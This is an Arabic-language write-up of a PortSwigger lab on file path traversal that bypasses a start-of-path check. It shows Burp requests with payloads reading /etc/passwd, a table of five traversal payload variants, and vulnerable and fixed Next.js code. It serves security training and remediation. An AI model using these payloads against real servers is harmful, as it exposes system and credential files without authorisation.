# Lab: File path traversal, validation of start of path

> **Category:** Path Traversal  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة Path Traversal في عرض صور المنتجات، ولكن هذه المرة الخادم **يتحقق أن المسار يبدأ بمجلد معين** (`/var/www/images/`)، لذلك سنستخدم **المسار الكامل مع `../`** لتجاوز الفلتر.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: الدخول إلى المختبر

- اضغط **Access the lab** لفتح موقع المتجر الوهمي.

### الخطوة 2: تشغيل Burp Suite واعتراض الطلب

- افتح Burp Suite وتأكد من تشغيل الـ Proxy.
- اضغط على أي منتج لعرض صورته.
- في Burp → **Proxy > HTTP history**، ابحث عن الطلب:

```http
GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
```

### الخطوة 3: إرسال الطلب إلى Repeater

- حدد الطلب، زر الماوس الأيمن → **Send to Repeater**.

### الخطوة 4: تجربة الطريقة القديمة (ستفشل)

جرب `../../../etc/passwd` أولاً:
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```
ستجد أنها **لا تعمل** لأن الخادم يتطلب أن يبدأ المسار بـ `/var/www/images/`.

### الخطوة 5: فهم آلية الفلتر

الخادم يتحقق أن `filename` يبدأ بـ `/var/www/images/` قبل استخدامه.

### الخطوة 6: استخدام المسار الكامل مع ../

غير `filename` إلى:
```
/var/www/images/../../../etc/passwd
```

يصبح الطلب:
```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

### الخطوة 7: ماذا يحدث خلف الكواليس؟

| الخطوة | القيمة |
|--------|--------|
| ما نرسله | `/var/www/images/../../../etc/passwd` |
| بعد التحقق | يبدأ بالمسار المطلوب ✅ |
| المسار النهائي | `/var/www/images/../../../etc/passwd` = `/etc/passwd` |

### الخطوة 8: إرسال الطلب

- اضغط **Send** في Repeater.

### الخطوة 9: مشاهدة النتيجة

ستظهر استجابة تحتوي على محتوى `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
```

### الخطوة 10: حل المختبر

بمجرد ظهور المحتوى، تم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **كيف يعمل التحقق؟** | الخادم يتأكد أن المسار يبدأ بـ `/var/www/images/` |
| **كيف تجاوزناه؟** | كتبنا المسار الكامل ثم أضفنا `../` للخروج منه |
| **ماذا يعني هذا؟** | التحقق من بداية المسار فقط غير كافٍ للأمان |
| **الفرق عن اللاب الثاني؟** | الثاني كان يمنع `../`، وهذا يسمح به لكن بشرط |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يتحقق فقط من **بداية** المسار، وليس من **المسار النهائي** بعد معالجة `../`.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
const { filename } = req.query;

// خطأ: يتحقق فقط من بداية المسار
if (!filename.startsWith('/var/www/images/')) {
  return res.status(403).send('Forbidden');
}

const filePath = path.join(filename); // مباشرة بدون تنظيف
fs.readFileSync(filePath);
```

---

### ✅ Compliant Code (Next.js)

```javascript
const { filename } = req.query;

// التصحيح: تحويل المسار إلى مسار حقيقي (canonical path)
const requestedPath = path.resolve('/var/www/images', filename);

// التأكد أن المسار النهائي لا يزال داخل المجلد المسموح
const imagesPath = path.resolve('/var/www/images');
if (!requestedPath.startsWith(imagesPath)) {
  return res.status(403).send('Forbidden');
}

const filePath = requestedPath;
fs.readFileSync(filePath);
```

**الخلاصة:** التحقق من بداية المسار لا يكفي، يجب التحقق من **المسار النهائي** بعد تطبيع `../`.

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **استخدام `path.resolve()`:** لتحويل المسار إلى مسار حقيقي (Canonical Path).
2. **التحقق من المسار النهائي:** تأكد أن المسار لا يزال داخل المجلد المسموح.
3. **استخدام `path.basename()`:** إذا كنت تحتاج فقط اسم الملف وليس مساراً كاملاً.
4. **قائمة بيضاء (Whitelist):** حدد أسماء الملفات المسموحة مسبقاً.

---

## 📊 ملخص لابات Path Traversal

| اللاب | الفلتر | البايلود |
|-------|--------|----------|
| الأول | ولا فلتر | `../../../etc/passwd` |
| الثاني | يمنع `../` | `/etc/passwd` |
| الثالث | يحذف `../` مرة واحدة | `....//....//....//etc/passwd` |
| الرابع | يمنع `../` ثم URL-decode | `..%252f..%252f..%252fetc/passwd` |
| الخامس | يتحقق من بداية المسار | `/var/www/images/../../../etc/passwd` |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
- [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal)
- [Path Canonicalization](https://portswigger.net/web-security/file-path-traversal)
